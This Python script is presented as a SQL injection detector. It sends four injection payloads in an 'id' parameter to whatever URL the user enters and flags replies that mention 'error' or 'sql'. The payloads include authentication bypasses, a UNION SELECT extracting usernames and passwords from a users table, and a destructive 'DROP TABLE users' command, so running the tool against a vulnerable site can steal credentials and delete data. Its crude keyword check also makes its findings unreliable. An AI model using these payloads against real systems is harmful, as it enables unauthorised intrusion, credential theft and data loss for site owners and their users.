import requests

class SQLInjectionDetector:
    def __init__(self, payloads):
        self.payloads = payloads

    def test_url(self, url, payload):
        test_url = f"{url}?id={payload}"
        try:
            response = requests.get(test_url)
            return response.text
        except requests.exceptions.RequestException:
            return None

    def detect_vulnerability(self, url):
        for payload in self.payloads:
            response_text = self.test_url(url, payload)
            if response_text and ("error" in response_text.lower() or "sql" in response_text.lower()):
                print(f"Potential SQL Injection vulnerability detected with payload: {payload}")
            else:
                print(f"No vulnerability detected with payload: {payload}")

if __name__ == "__main__":
    payloads = [
        "' OR '1'='1'; --",
        "' OR '1'='1' /*",
        "' UNION SELECT null, username, password FROM users; --",
        "'; DROP TABLE users; --"
    ]
    target_url = input("Enter the target URL (e.g., http://example.com/page): ")
    detector = SQLInjectionDetector(payloads)
    detector.detect_vulnerability(target_url)
